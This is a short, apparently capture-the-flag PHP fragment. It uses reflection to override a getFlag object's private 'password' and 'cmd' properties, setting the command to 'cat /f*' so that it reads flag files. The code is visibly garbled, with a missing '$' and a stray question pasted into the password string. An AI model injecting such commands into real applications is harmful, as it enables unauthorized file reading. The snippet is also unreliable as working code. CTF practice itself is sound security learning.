<?php
a=$flag= new getFlag();
$b=new ReflectionObject($flag);
$c=$b->getProperty("password");
$c->setAccessible(true);
$c->setValue($flag,'??  //how to change the private variables??secret');
$d=$b->getProperty("cmd");
$d->setAccessible(true);
$d->setValue($flag,'cat /f*');